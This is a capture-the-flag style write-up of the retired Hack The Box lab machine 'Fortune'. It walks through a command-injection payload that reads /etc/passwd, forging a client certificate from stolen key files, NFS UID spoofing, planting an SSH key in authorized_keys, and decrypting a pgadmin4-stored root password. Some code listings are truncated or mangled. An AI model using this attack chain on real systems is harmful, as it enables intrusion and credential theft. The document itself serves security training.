### TL;DR 
There might not necessarily be anything "new" in this box if you've done all of the previous ones, but it's my absolute personal favorite. Thank you so much <a href="https://www.hackthebox.eu/home/users/profile/46317">AuxSarge</a> for creating it. I was so sad when it retired! üò¢
<p><br></p>

### Overview

The `Fortune` machine on Hack The Box (created by <a href="https://www.hackthebox.eu/home/users/profile/46317">AuxSarge</a>) is a retired 50 point OpenBSD machine with some pretty interesting parts to it. If you have completed all of the previous boxes on Hack The Box, then `Fortune` should be pretty simple, as there is nothing particularly new introduced.
<p><br></p>

The box starts with simple web enumeration to locate RCE found in the site's `db` variable, which occurs when a semi colon (;) is appended to the end of the `db`. Next, some files are located via the RCE that can be used to create a PKCS12 certificate which permits access to port 443. From there, an SSH key is located to access the user called `nfsuser` and escalate to the user `charlie` by mounting a newly found nfs share and using `su` to access `charlie` with a local user that has the same UID. SSH keys for `charlie` are then used to access the user via SSH and enumerate further.
<p><br></p>

Finally, there is a `pgadmin4` database running on the box which contains hashes for the root password. A file called `crypto.py` is utilized for `pgadmin4's` encoding/decoding process, and can be used here to decode the root password and ultimately grab the flag.
<p><br></p>

### Nmap Scan

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/HTB-FORTUNE# nmap -sC -sV -A -Pn 10.10.10.127

</code></pre></div></div>

So, it appears port `443` is HTTPS (as expected), but it requires an SSL certificate to access it. I'll leave it alone for now because of this. However, port `80` proves to be quite interesting.
<p><br></p>

### Web Enumeration

Here's what I discovered upon navigating to `http://10.10.10.127/` in my browser:

<img src="/assets/img/writeups/HTB-FORTUNE/fortune-homepage.PNG" class="fortune-img" alt="Hack The Box - Fortune Homepage">

Hmm... 

Let's try capturing a request with `Burp Suite`!

```
POST /select HTTP/1.1
Host: 10.10.10.127
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0

db=fortunes
```

The `db` variable looks pretty spicy! üå∂Ô∏è

After running `wfuzz`, I discovered I could append a semi colon (;) to `db` and execute commands on the box, like so:

```
POST /select HTTP/1.1

And the response:
```

</body>
```

Nice! We have code execution. Let's have a look around to see what else we can find. 
<p><br></p>

### File Enumeration & NFS Share Access

(Shortened output for readability):

```
db=fortunes;cat /etc/passwd

charlie:*:1000:1000:Charlie:/home/charlie:/bin/ksh
bob:*:1001:1001::/home/bob:/bin/ksh
nfsuser:*:1002:1002::/home/nfsuser:/usr/sbin/authpf
```

Well, well, well... It would appear we have three different users here. They are `charlie`, `bob`, and `nfsuser`. Immediately, `nfsuser` appears interesting to me given the naming convention. The username `nfsuser` can easily be attributed to an `nfs share`! Now, this is great and all, but I still don't know how to access these users, nor am I able to add my own `ssh` keys... I was able to `ping` myself at this point, but couldn't manage to get a shell back.
<p><br></p>

However, I did some snooping around and discovered some files in the user `bob`'s home directory (`/home/bob`). There was one cert file (`intermediate.cert.pem`) and one key file (`intermediate.key.pem`), which can be converted to a PKCS12 certificate. I used `openssl` to create the certificate, like so:

```
openssl pkcs12 -export -out fortune.htb.p12 -in intermediate.cert.pem -inkey intermediate.key.pem
```
I was then able to import the certificate with Firefox and access the (now unrestricted) `HTTPS` port, `443`.

This is the prompt I received upon importing my certificate:

<img src="/assets/img/writeups/HTB-FORTUNE/fortune-cert-prompt.PNG" class="fortune-img" alt="Hack The Box - Fortune Homepage">

The `HTTPS` homepage displayed this message upon my first visit:

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>You will need to use the local authpf service to obtain elevated network access. 
If you do not already have the appropriate SSH key pair, then you will need 
to <a href="https://10.10.10.127/generate">generate</a> one and configure your local system appropriately to proceed.
</code></pre></div></div>

I clicked on `generate` and it redirected me to a page that looked like this:

<a href="https://defarbs.com/assets/img/writeups/HTB-FORTUNE/fortune-generate-page.PNG">
  <img src="/assets/img/writeups/HTB-FORTUNE/fortune-generate-page.PNG" class="fortune-img" alt="Hack The Box - Fortune Homepage">
<a>

Note: If the above image is too small, click it to expand!

It looks like an SSH keypair appeared!

<img src="/assets/img/writeups/HTB-FORTUNE/surprised-pikachu.jpg" class="fortune-img" alt="Surprised Pikachu!">

This is great, because it means we can now access a user account! I threw the newly found keypair into respective files (`nfsuser_rsa` and `nfsuser_rsa.pub`). After doing some digging around with the RCE mentioned earlier, I noticed that `authpf` was installed, which is why I thusly associated the keys with the `nfsuser` account. I then tried using the ssh keypair I found at `/generate` to log in via SSH, like so:

```
+[root@kali: keys]$ ssh -i nfsuser_rsa nfsuser@10.10.10.127

Hello nfsuser. You are authenticated from host "10.10.14.34"
```

So, there appears to be some interesting output here. After authenticating via SSH, I ran another nmap scan to see what was *really* happening here. It turns out, logging in via SSH as `nfsuser` allows us to mount the `/home` directory as anyone we want! During prior enumeration, I located two other users: `bob` and `charlie`. I have already accessed `bob's` directory, but have not been able to access `charlie`. 

I ended up managing to mount `/home` locally by running the `mount` command like so:

```
mount -t nfs 10.10.10.127:/home /temp -o nolock
```
I already had the empty `/temp` directory created beforehand. Once the share was mounted, I checked to see what was there:

```
+[root@kali: temp]$ ls -al
total 40
drwxr-xr-x  5 root  root      512 Nov  2  2018 .
drwxr-xr-x 21 root  root    32768 Sep 17 17:15 ..
drwxr-xr-x  5  1001 charlie   512 Nov  3  2018 bob
drwxr-x---  3 farbs farbs     512 Nov  5  2018 charlie
drwxr-xr-x  2  1002    1002   512 Nov  2  2018 nfsuser
```
Cool, all of the directories are outputted. I have created a local user named `farbs` which shares the same UID as `charlie`. Therefore, I can simply enter `su farbs` and access the `charlie` directory since the permissions already match.

```
+[root@kali: temp]$ su farbs
farbs@kali:/temp$ cd charlie
farbs@kali:/temp/charlie$ wc -c user.txt
33 user.txt
```
And... we got `user.txt`!

From here, I went ahead and generated my own ssh keypair and then added my public key to the `authorized_keys` file belonging to `charlie` so I could ssh in as `charlie`. 

Once I had my ssh keypair generated, I added it to the `authorized_keys` file:

```
farbs@kali:/temp/charlie/.ssh$ echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCgGP15cHMY8+Mg8aUg5mml5t6jxpY43paksKO84vhdJdaKFQnryShQI2GbzpbNkV0ICl1yJnKdN0DfnLOXcAkt6YLSvOR7tModGaP/0XOCGBWneO7/U4HMnuEX4VcfHoR+AoCjmCNx8diQvO/yytLDmEJic4yYEUz8m2nA7l14AE6t+YtaJO5tzvJ6CSHaOGVrZiGqCGq2tkE9kN5o+Wg77P3Z8Vq72tOsitQ+hUSloLkMFVUKZWQSGsY1s/3G/b6eT4ZyetVU3Nggv+QYAbWfMDbj+imeREz7Z7T/bxy1tjENq1NSrB/5bZlmAuP/KyKDwI3sktNbhi80q+YRE9ELIA44taj+SjKZ6tZZjQUJIxLt7mZteiw7XgLaVveG+YB9WV1ymxt2wfkQ3Ht6cjl+9JYxoHXIdfBmAivh3goFIOFdxxLRt3RAq/DqlQY4/t3WltAu3LCtBTs8746OMh/vEJFyNOtlPiAXV2f3pGPAYsq4hjYLiV6MDNDvD4+lZKs= >> authorized_keys
```

I then unmounted the share and SSH'd in as `charlie`:

```
+[root@kali: writeup_ssh]$ ssh -i id_rsa charlie@10.10.10.127
OpenBSD 6.4 (GENERIC) #349: Thu Oct 11 13:25:13 MDT 2018

Welcome to OpenBSD: The proactively secure Unix-like operating system.
fortune$ whoami
charlie
```

Now that we're in, it's time to do some more enumeration! I notice an `mbox` file sitting in `charlie's` home directory, so I take a look at it. It reads the following:

```

Status: RO

Hi Charlie,

Thanks for setting-up pgadmin4 for me. Seems to work great so far.
BTW: I set the dba password to the same as root. I hope you don't mind.

Cheers,

Bob
```
Looks like `Bob` decided to drop us a hint about the `pgadmin4` database! `Bob` appears to have set the database admin's password to the same thing as the `root` password. With this in mind, I started snooping around to see if I could find the `pgadmin4` database on the box in order to thusly attempt to read its contents.

After a bit of digging, I found that the dba's password to the `PostgreSQL` database actually resides in an `SQLite3` database located at `/var/appsrv/pgadmin4/pgadmin4.db`.

I looked up `pgadmin4` online and found the open source GitHub page for it. Upon sifting through some of the code, I found these lines around the line ~250 mark:

```python
  try:
      password = decrypt(encpass, user.password)
      # Handling of non ascii password (Python2)
      if hasattr(str, 'decode'):
          password = password.decode('utf-8').encode('utf-8')
        # password is in bytes, for python3 we need it in string
      elif isinstance(password, bytes):
          password = password.decode()

  except Exception as e:
      manager.stop_ssh_tunnel()
      current_app.logger.exception(e)
      return False, \
          _(
              "Failed to decrypt the saved password.\nError: {0}"
          ).format(str(e))
```

At the top, I noticed that the decryption key is pulled from the `user.password`, which can actually already be found in the `pgadmin4.db` file. At this point, I wanted to understand how the `decrypt()` function was working. The code for it can be found here:

```python
def decrypt(ciphertext, key):
    """
    Decrypt the AES encrypted string.

    Parameters:
        ciphertext -- Encrypted string with AES method.
        key        -- key to decrypt the encrypted string.
    """

    ciphertext = base64.b64decode(ciphertext)
    iv = ciphertext\[:iv_size\]

    cipher = Cipher(AES(pad(key)), CFB8(iv), default_backend())
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext\[iv_size:\]) + decryptor.finalize()


def pad(key):
    """Add padding to the key."""

    if isinstance(key, six.text_type):
        key = key.encode()

    # Key must be maximum 32 bytes long, so take first 32 bytes
    key = key\[:32\]

    # If key size is 16, 24 or 32 bytes then padding is not required
    if len(key) in (16, 24, 32):
        return key

    # Add padding to make key 32 bytes long
    return key.ljust(32, padding_string)
```

This is perfect, because all of the parameters are already found in the `pgadmin4.db` file.

Once I opened the database with `sqlite3`, I ran `.tables` to check what tables existed in the database.

```sql
sqlite> .tables
alembic_version              roles_users                
debugger_function_arguments  server                     
keys                         servergroup                
module_preference            setting                    
preference_category          user                       
preferences                  user_preferences           
process                      version                    
role 
```

I ended up determining that the `server` table contained the username and password contents for the database administrator:

```sql
sqlite> select username,password from server;
dba|utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz
```

In addition, I could grab user password hashes as keys like so:

```sql
sqlite> select email,password from user;
charlie@fortune.htb|$pbkdf2-sha512$25000$3hvjXAshJKQUYgxhbA0BYA$iuBYZKTTtTO.cwSvMwPAYlhXRZw8aAn9gBtyNQW3Vge23gNUMe95KqiAyf37.v1lmCunWVkmfr93Wi6.W.UzaQ
bob@fortune.htb|$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg
```

To decrypt the credentials, I ended up grabbing a copy of the original `crypto.py` file containing the `decrypt()` function from the `pgadmin4` GitHub page to run on my local kali machine.

I added a couple lines at the bottom of the file that would create a variable called `admpass` and then utilize the `decrypt()` function to decrypt the data we found. Once decrypted, the password is stored in the `admpass` variable and then printed into console.

Here is my finalized code for the `crypto.py` file:

```python

def encrypt(plaintext, key):
    """

    cipher = AES.new(pad(key), AES.MODE_CFB, iv)
    # If user has entered non ascii password (Python2)
    # we have to encode it first
    if hasattr(str, 'decode'):
        plaintext = plaintext.encode('utf-8')
    encrypted = base64.b64encode(iv + cipher.encrypt(plaintext))

    return encrypted


def decrypt(ciphertext, key):
    """

    Parameters:

    """

    global padding_string

    ciphertext = base64.b64decode(ciphertext)
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(pad(key), AES.MODE_CFB, iv)
    decrypted = cipher.decrypt(ciphertext[AES.block_size:])

    return decrypted


def pad(key):
    """Add padding to the key."""

    global padding_string
    str_len = len(key)

    # Key must be maximum 32 bytes long, so take first 32 bytes
    if str_len > 32:
        return key[:32]

    # If key size id 16, 24 or 32 bytes then padding not require
    if str_len == 16 or str_len == 24 or str_len == 32:
        return key

    # Convert bytes to string (python3)
    if not hasattr(str, 'decode'):
        padding_string = padding_string.decode()

    # Add padding to make key 32 bytes long
    return key + ((32 - str_len % 32) * padding_string)


def pqencryptpassword(password, user):

print(admpass)
```

To get it working, I had to use the password hash belonging to `bob`. 

Upon running it locally, `crypto.py` spit out the password immediately!

```
+[root@kali: HTB-FORTUNE]$ python crypto.py 
R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!
```

Now it's game over! I can run `su root` from my shell as `charlie` to gain root and `cat root.txt`!

```
fortune$ whoami
charlie
